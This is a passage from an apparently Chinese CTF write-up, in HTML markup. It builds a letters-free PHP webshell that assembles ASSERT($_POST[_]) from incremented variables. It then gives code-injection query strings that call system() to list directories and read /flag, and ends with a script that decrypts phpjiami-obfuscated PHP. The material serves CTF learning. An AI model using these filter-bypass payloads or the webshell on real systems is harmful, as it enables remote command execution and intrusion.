class=\"token operator\">++</span><span class=\"token punctuation\">;</span><span class=\"token variable\">$__</span><span class=\"token operator\">++</span><span class=\"token punctuation\">;</span><span class=\"token variable\">$__</span><span class=\"token operator\">++</span><span class=\"token punctuation\">;</span><span class=\"token variable\">$__</span><span class=\"token operator\">++</span><span class=\"token punctuation\">;</span><span class=\"token variable\">$__</span><span class=\"token operator\">++</span><span class=\"token punctuation\">;</span><span class=\"token variable\">$__</span><span class=\"token operator\">++</span><span class=\"token punctuation\">;</span><span class=\"token variable\">$__</span><span class=\"token operator\">++</span><span class=\"token punctuation\">;</span><span class=\"token variable\">$__</span><span class=\"token operator\">++</span><span class=\"token punctuation\">;</span><span class=\"token variable\">$__</span><span class=\"token operator\">++</span><span class=\"token punctuation\">;</span><span class=\"token variable\">$__</span><span class=\"token operator\">++</span><span class=\"token punctuation\">;</span><span class=\"token variable\">$__</span><span class=\"token operator\">++</span><span class=\"token punctuation\">;</span><span class=\"token variable\">$__</span><span class=\"token operator\">++</span><span class=\"token punctuation\">;</span><span class=\"token variable\">$__</span><span class=\"token operator\">++</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">// O</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre><span class=\"token variable\">$____</span><span class=\"token operator\">.=</span><span class=\"token variable\">$__</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre><span class=\"token variable\">$__</span><span class=\"token operator\">=</span><span class=\"token variable\">$_</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre><span class=\"token variable\">$__</span><span class=\"token operator\">++</span><span class=\"token punctuation\">;</span><span class=\"token variable\">$__</span><span class=\"token operator\">++</span><span class=\"token punctuation\">;</span><span class=\"token variable\">$__</span><span class=\"token operator\">++</span><span class=\"token punctuation\">;</span><span class=\"token variable\">$__</span><span class=\"token operator\">++</span><span class=\"token punctuation\">;</span><span class=\"token variable\">$__</span><span class=\"token operator\">++</span><span class=\"token punctuation\">;</span><span class=\"token variable\">$__</span><span class=\"token operator\">++</span><span class=\"token punctuation\">;</span><span class=\"token variable\">$__</span><span class=\"token operator\">++</span><span class=\"token punctuation\">;</span><span class=\"token variable\">$__</span><span class=\"token operator\">++</span><span class=\"token punctuation\">;</span><span class=\"token variable\">$__</span><span class=\"token operator\">++</span><span class=\"token punctuation\">;</span><span class=\"token variable\">$__</span><span class=\"token operator\">++</span><span class=\"token punctuation\">;</span><span class=\"token variable\">$__</span><span class=\"token operator\">++</span><span class=\"token punctuation\">;</span><span class=\"token variable\">$__</span><span class=\"token operator\">++</span><span class=\"token punctuation\">;</span><span class=\"token variable\">$__</span><span class=\"token operator\">++</span><span class=\"token punctuation\">;</span><span class=\"token variable\">$__</span><span class=\"token operator\">++</span><span class=\"token punctuation\">;</span><span class=\"token variable\">$__</span><span class=\"token operator\">++</span><span class=\"token punctuation\">;</span><span class=\"token variable\">$__</span><span class=\"token operator\">++</span><span class=\"token punctuation\">;</span><span class=\"token variable\">$__</span><span class=\"token operator\">++</span><span class=\"token punctuation\">;</span><span class=\"token variable\">$__</span><span class=\"token operator\">++</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">// S</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre><span class=\"token variable\">$____</span><span class=\"token operator\">.=</span><span class=\"token variable\">$__</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre><span class=\"token variable\">$__</span><span class=\"token operator\">=</span><span class=\"token variable\">$_</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre><span class=\"token variable\">$__</span><span class=\"token operator\">++</span><span class=\"token punctuation\">;</span><span class=\"token variable\">$__</span><span class=\"token operator\">++</span><span class=\"token punctuation\">;</span><span class=\"token variable\">$__</span><span class=\"token operator\">++</span><span class=\"token punctuation\">;</span><span class=\"token variable\">$__</span><span class=\"token operator\">++</span><span class=\"token punctuation\">;</span><span class=\"token variable\">$__</span><span class=\"token operator\">++</span><span class=\"token punctuation\">;</span><span class=\"token variable\">$__</span><span class=\"token operator\">++</span><span class=\"token punctuation\">;</span><span class=\"token variable\">$__</span><span class=\"token operator\">++</span><span class=\"token punctuation\">;</span><span class=\"token variable\">$__</span><span class=\"token operator\">++</span><span class=\"token punctuation\">;</span><span class=\"token variable\">$__</span><span class=\"token operator\">++</span><span class=\"token punctuation\">;</span><span class=\"token variable\">$__</span><span class=\"token operator\">++</span><span class=\"token punctuation\">;</span><span class=\"token variable\">$__</span><span class=\"token operator\">++</span><span class=\"token punctuation\">;</span><span class=\"token variable\">$__</span><span class=\"token operator\">++</span><span class=\"token punctuation\">;</span><span class=\"token variable\">$__</span><span class=\"token operator\">++</span><span class=\"token punctuation\">;</span><span class=\"token variable\">$__</span><span class=\"token operator\">++</span><span class=\"token punctuation\">;</span><span class=\"token variable\">$__</span><span class=\"token operator\">++</span><span class=\"token punctuation\">;</span><span class=\"token variable\">$__</span><span class=\"token operator\">++</span><span class=\"token punctuation\">;</span><span class=\"token variable\">$__</span><span class=\"token operator\">++</span><span class=\"token punctuation\">;</span><span class=\"token variable\">$__</span><span class=\"token operator\">++</span><span class=\"token punctuation\">;</span><span class=\"token variable\">$__</span><span class=\"token operator\">++</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">// T</span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre><span class=\"token variable\">$____</span><span class=\"token operator\">.=</span><span class=\"token variable\">$__</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"33\"></td><td><pre></pre></td></tr><tr><td data-num=\"34\"></td><td><pre><span class=\"token variable\">$_</span><span class=\"token operator\">=</span><span class=\"token variable\">$$____</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"35\"></td><td><pre><span class=\"token variable\">$___</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_</span><span class=\"token punctuation\">[</span><span class=\"token constant\">_</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">// ASSERT($_POST[_]);</span></span></pre></td></tr></table></figure><h3 id=\"利用原数组构建\"><a class=\"anchor\" href=\"#利用原数组构建\">#</a> 利用原数组构建</h3>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>s<span class=\"token operator\">=</span><span class=\"token punctuation\">[</span><span class=\"token string\">'a'</span><span class=\"token punctuation\">,</span><span class=\"token string\">'b'</span><span class=\"token punctuation\">,</span><span class=\"token string\">'c'</span><span class=\"token punctuation\">,</span><span class=\"token string\">'d'</span><span class=\"token punctuation\">,</span><span class=\"token string\">'e'</span><span class=\"token punctuation\">,</span><span class=\"token string\">'f'</span><span class=\"token punctuation\">,</span><span class=\"token string\">'g'</span><span class=\"token punctuation\">,</span><span class=\"token string\">'h'</span><span class=\"token punctuation\">,</span><span class=\"token string\">'i'</span><span class=\"token punctuation\">,</span><span class=\"token string\">'j'</span><span class=\"token punctuation\">,</span><span class=\"token string\">'k'</span><span class=\"token punctuation\">,</span><span class=\"token string\">'m'</span><span class=\"token punctuation\">,</span><span class=\"token string\">'n'</span><span class=\"token punctuation\">,</span><span class=\"token string\">'l'</span><span class=\"token punctuation\">,</span><span class=\"token string\">'o'</span><span class=\"token punctuation\">,</span><span class=\"token string\">'p'</span><span class=\"token punctuation\">,</span><span class=\"token string\">'q'</span><span class=\"token punctuation\">,</span><span class=\"token string\">'r'</span><span class=\"token punctuation\">,</span><span class=\"token string\">'s'</span><span class=\"token punctuation\">,</span><span class=\"token string\">'t'</span><span class=\"token punctuation\">,</span><span class=\"token string\">'u'</span><span class=\"token punctuation\">,</span><span class=\"token string\">'v'</span><span class=\"token punctuation\">,</span><span class=\"token string\">'w'</span><span class=\"token punctuation\">,</span><span class=\"token string\">'x'</span><span class=\"token punctuation\">,</span><span class=\"token string\">'y'</span><span class=\"token punctuation\">,</span><span class=\"token string\">'z'</span><span class=\"token punctuation\">,</span><span class=\"token string\">'\\~'</span><span class=\"token punctuation\">,</span><span class=\"token string\">'\\^'</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>word<span class=\"token operator\">=</span><span class=\"token builtin\">input</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>code<span class=\"token operator\">=</span><span class=\"token string\">''</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token keyword\">for</span> j <span class=\"token keyword\">in</span> word<span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>        <span class=\"token keyword\">if</span> j <span class=\"token keyword\">in</span> s<span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>            code<span class=\"token operator\">+=</span><span class=\"token string\">'$_['</span><span class=\"token operator\">+</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>s<span class=\"token punctuation\">.</span>index<span class=\"token punctuation\">(</span>j<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token operator\">+</span><span class=\"token string\">'].'</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>        <span class=\"token keyword\">else</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>            code<span class=\"token operator\">+=</span><span class=\"token string\">\"'\"</span><span class=\"token operator\">+</span>j<span class=\"token operator\">+</span><span class=\"token string\">\"'\"</span><span class=\"token operator\">+</span><span class=\"token string\">\".\"</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>code<span class=\"token punctuation\">)</span></pre></td></tr></table></figure><p>system:  <code>$_[18].$_[24].$_[18].$_[19].$_[4].$_[11]</code> <br />\nls：  <code>$_[13].$_[18]</code> <br />\ncat：  <code>$_[2].$_[0].$_[19]</code> <br />\nflag:  <code>$_[5].$_[13].$_[0].$_[6]</code></p>\n<h4 id=\"第一种\"><a class=\"anchor\" href=\"#第一种\">#</a> 第一种</h4>\n<p>ls:</p>\n<figure class=\"highlight raw\"><figcaption data-lang=\"\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>?code&#x3D;&#96;$_[13]$_[18]&#96;</pre></td></tr></table></figure><p>nl /* :</p>\n<figure class=\"highlight raw\"><figcaption data-lang=\"\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>?code&#x3D;&#96;$_[12]$_[13]%20&#x2F;*&#96;</pre></td></tr></table></figure><h4 id=\"第二种\"><a class=\"anchor\" href=\"#第二种\">#</a> 第二种</h4>\n<p>system('ls')</p>\n<figure class=\"highlight raw\"><figcaption data-lang=\"\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>?code&#x3D;1);$__&#x3D;$_[18].$_[24].$_[18].$_[19].$_[4].$_[11];$___&#x3D;$_[13].$_[18];$__($___);(1</pre></td></tr><tr><td data-num=\"2\"></td><td><pre>得到</pre></td></tr><tr><td data-num=\"3\"></td><td><pre>1hhh.php hint.php index.php phpjiami.zip</pre></td></tr></table></figure><p>system('ls /')</p>\n<figure class=\"highlight raw\"><figcaption data-lang=\"\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>?code&#x3D;1);$__&#x3D;$_[18].$_[24].$_[18].$_[19].$_[4].$_[11];$___&#x3D;$_[13].$_[18];$__($___.&#39; &#x2F;&#39;);(1</pre></td></tr><tr><td data-num=\"2\"></td><td><pre>得到</pre></td></tr><tr><td data-num=\"3\"></td><td><pre>1bin dev etc flag home lib media mnt proc root run sbin srv sys tmp usr var</pre></td></tr></table></figure><p>system('cat /flag')</p>\n<figure class=\"highlight raw\"><figcaption data-lang=\"\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>?code&#x3D;1);$__&#x3D;$_[18].$_[24].$_[18].$_[19].$_[4].$_[11];$___&#x3D;$_[2].$_[0].$_[19].&#39; &#x2F;&#39;.$_[5].$_[13].$_[0].$_[6];$__($___.&#39; &#x2F;&#39;);(1</pre></td></tr><tr><td data-num=\"2\"></td><td><pre>得到 flag</pre></td></tr></table></figure><h3 id=\"预期解\"><a class=\"anchor\" href=\"#预期解\">#</a> 预期解</h3>\n<p><code>?code=$&#123;$_[7].$_[8].$_[12].$_[19]&#125;</code>  读取 hint 文件</p>\n<p>那么即可下载压缩包，但得出来的是一个混淆后的 php 文件，大佬的解密 php 脚本：</p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">function</span> <span class=\"token function-definition function\">decrypt</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$data</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$key</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>    <span class=\"token variable\">$data_1</span> <span class=\"token operator\">=</span> <span class=\"token string single-quoted-string\">''</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>    <span class=\"token keyword\">for</span> <span class=\"token punctuation\">(</span><span class=\"token variable\">$i</span> <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span> <span class=\"token variable\">$i</span> <span class=\"token operator\">&lt;</span> <span class=\"token function\">strlen</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$data</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token variable\">$i</span><span class=\"token operator\">++</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>        <span class=\"token variable\">$ch</span> <span class=\"token operator\">=</span> <span class=\"token function\">ord</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$data</span><span class=\"token punctuation\">[</span><span class=\"token variable\">$i</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>        <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token variable\">$ch</span> <span class=\"token operator\">&lt;</span> <span class=\"token number\">245</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>            <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token variable\">$ch</span> <span class=\"token operator\">></span> <span class=\"token number\">136</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>                <span class=\"token variable\">$data_1</span> <span class=\"token operator\">.=</span> <span class=\"token function\">chr</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$ch</span> <span class=\"token operator\">/</span> <span class=\"token number\">2</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>            <span class=\"token punctuation\">&#125;</span> <span class=\"token keyword\">else</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>                <span class=\"token variable\">$data_1</span> <span class=\"token operator\">.=</span> <span class=\"token variable\">$data</span><span class=\"token punctuation\">[</span><span class=\"token variable\">$i</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>            <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>        <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>    <span class=\"token variable\">$data_1</span> <span class=\"token operator\">=</span> <span class=\"token function\">base64_decode</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$data_1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>    <span class=\"token variable\">$key</span> <span class=\"token operator\">=</span> <span class=\"token function\">md5</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$key</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>    <span class=\"token variable\">$j</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$ctrmax</span> <span class=\"token operator\">=</span> <span class=\"token number\">32</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>    <span class=\"token variable\">$data_2</span> <span class=\"token operator\">=</span> <span class=\"token string single-quoted-string\">''</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>    <span class=\"token keyword\">for</span> <span class=\"token punctuation\">(</span><span class=\"token variable\">$i</span> <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span> <span class=\"token variable\">$i</span> <span class=\"token operator\">&lt;</span> <span class=\"token function\">strlen</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$data_1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token variable\">$i</span><span class=\"token operator\">++</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>        <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token variable\">$j</span> <span class=\"token operator\">&lt;=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>            <span class=\"token variable\">$j</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$ctrmax</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>        <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>        <span class=\"token variable\">$j</span><span class=\"token operator\">--</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>        <span class=\"token variable\">$data_2</span> <span class=\"token operator\">.=</span>  <span class=\"token variable\">$data_1</span><span class=\"token punctuation\">[</span><span class=\"token variable\">$i</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">^</span> <span class=\"token variable\">$key</span><span class=\"token punctuation\">[</span><span class=\"token variable\">$j</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>    <span class=\"token keyword\">return</span> <span class=\"token variable\">$data_2</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre></pre></td></tr><tr><td data-num=\"28\"></td><td><pre><span class=\"token keyword\">function</span> <span class=\"token function-definition function\">find_data</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$code</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre>    <span class=\"token variable\">$code_end</span> <span class=\"token operator\">=</span> <span class=\"token function\">strrpos</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$code</span><span class=\"token punctuation\">,</span> <span class=\"token string single-quoted-string\">'?>'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre>    <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token operator\">!</span><span class=\"token variable\">$code_end</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre>        <span class=\"token keyword\">return</span> <span class=\"token string double-quoted-string\">\"\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"33\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"34\"></td><td><pre>    <span class=\"token variable\">$data_start</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$code_end</span> <span class=\"token operator\">+</span> <span class=\"token number\">2</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"35\"></td><td><pre>    <span class=\"token variable\">$data</span> <span class=\"token operator\">=</span> <span class=\"token function\">substr</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$code</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$data_start</span><span class=\"token punctuation\">,</span> <span class=\"token operator\">-</span><span class=\"token number\">46</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"36\"></td><td><pre>    <span class=\"token keyword\">return</span> <span class=\"token variable\">$data</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"37\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"38\"></td><td><pre></pre></td></tr><tr><td data-num=\"39\"></td><td><pre><span class=\"token keyword\">function</span> <span class=\"token function-definition function\">find_key</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$code</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"40\"></td><td><pre><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"41\"></td><td><pre>    <span class=\"token comment\">// $v1 = $v2('bWQ1');</span></pre></td></tr><tr><td data-num=\"42\"></td><td><pre>    <span class=\"token comment\">// $key1 = $v1('??????');</span></pre></td></tr><tr><td data-num=\"43\"></td><td><pre>    <span class=\"token variable\">$pos1</span> <span class=\"token operator\">=</span> <span class=\"token function\">strpos</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$code</span><span class=\"token punctuation\">,</span> <span class=\"token string double-quoted-string\">\"('\"</span> <span class=\"token operator\">.</span> <span class=\"token function\">preg_quote</span><span class=\"token punctuation\">(</span><span class=\"token function\">base64_encode</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'md5'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">.</span> <span class=\"token string double-quoted-string\">\"');\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"44\"></td><td><pre>    <span class=\"token variable\">$pos2</span> <span class=\"token operator\">=</span> <span class=\"token function\">strrpos</span><span class=\"token punctuation\">(</span><span class=\"token function\">substr</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$code</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$pos1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> <span class=\"token string single-quoted-string\">'$'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"45\"></td><td><pre>    <span class=\"token variable\">$pos3</span> <span class=\"token operator\">=</span> <span class=\"token function\">strrpos</span><span class=\"token punctuation\">(</span><span class=\"token function\">substr</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$code</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$pos2</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> <span class=\"token string single-quoted-string\">'$'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"46\"></td><td><pre>    <span class=\"token variable\">$var_name</span> <span class=\"token operator\">=</span> <span class=\"token function\">substr</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$code</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$pos3</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$pos2</span> <span class=\"token operator\">-</span> <span class=\"token variable\">$pos3</span> <span class=\"token operator\">-</span> <span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"47\"></td><td><pre>    <span class=\"token variable\">$pos4</span> <span class=\"token operator\">=</span> <span class=\"token function\">strpos</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$code</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$var_name</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$pos1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"48\"></td><td><pre>    <span class=\"token variable\">$pos5</span> <span class=\"token operator\">=</span> <span class=\"token function\">strpos</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$code</span><span class=\"token punctuation\">,</span> <span class=\"token string double-quoted-string\">\"('\"</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$pos4</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"49\"></td><td><pre>    <span class=\"token variable\">$pos6</span> <span class=\"token operator\">=</span> <span class=\"token function\">strpos</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$code</span><span class=\"token punctuation\">,</span> <span class=\"token string double-quoted-string\">\"')\"</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$pos4</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"50\"></td><td><pre>    <span class=\"token variable\">$key</span> <span class=\"token operator\">=</span> <span class=\"token function\">substr</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$code</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$pos5</span> <span class=\"token operator\">+</span> <span class=\"token number\">2</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$pos6</span> <span class=\"token operator\">-</span> <span class=\"token variable\">$pos5</span> <span class=\"token operator\">-</span> <span class=\"token number\">2</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"51\"></td><td><pre>    <span class=\"token keyword\">return</span> <span class=\"token variable\">$key</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"52\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"53\"></td><td><pre></pre></td></tr><tr><td data-num=\"54\"></td><td><pre><span class=\"token variable\">$input_file</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$argv</span><span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"55\"></td><td><pre><span class=\"token variable\">$output_file</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$argv</span><span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">.</span> <span class=\"token string single-quoted-string\">'.decrypted.php'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"56\"></td><td><pre></pre></td></tr><tr><td data-num=\"57\"></td><td><pre><span class=\"token variable\">$code</span> <span class=\"token operator\">=</span> <span class=\"token function\">file_get_contents</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$input_file</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"58\"></td><td><pre></pre></td></tr><tr><td data-num=\"59\"></td><td><pre><span class=\"token variable\">$data</span> <span class=\"token operator\">=</span> <span class=\"token function\">find_data</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$code</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"60\"></td><td><pre><span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token operator\">!</span><span class=\"token variable\">$code</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"61\"></td><td><pre>    <span class=\"token keyword\">echo</span> <span class=\"token string single-quoted-string\">'未找到加密数据'</span><span class=\"token punctuation\">,</span> <span class=\"token constant\">PHP_EOL</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"62\"></td><td><pre>    <span class=\"token keyword\">exit</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"63\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"64\"></td><td><pre></pre></td></tr><tr><td data-num=\"65\"></td><td><pre><span class=\"token variable\">$key</span> <span class=\"token operator\">=</span> <span class=\"token function\">find_key</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$code</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"66\"></td><td><pre><span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token operator\">!</span><span class=\"token variable\">$key</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"67\"></td><td><pre>    <span class=\"token keyword\">echo</span> <span class=\"token string single-quoted-string\">'未找到秘钥'</span><span class=\"token punctuation\">,</span> <span class=\"token constant\">PHP_EOL</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"68\"></td><td><pre>    <span class=\"token keyword\">exit</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"69\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"70\"></td><td><pre></pre></td></tr><tr><td data-num=\"71\"></td><td><pre><span class=\"token variable\">$decrypted</span> <span class=\"token operator\">=</span> <span class=\"token function\">decrypt</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$data</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$key</span><span class=\"token 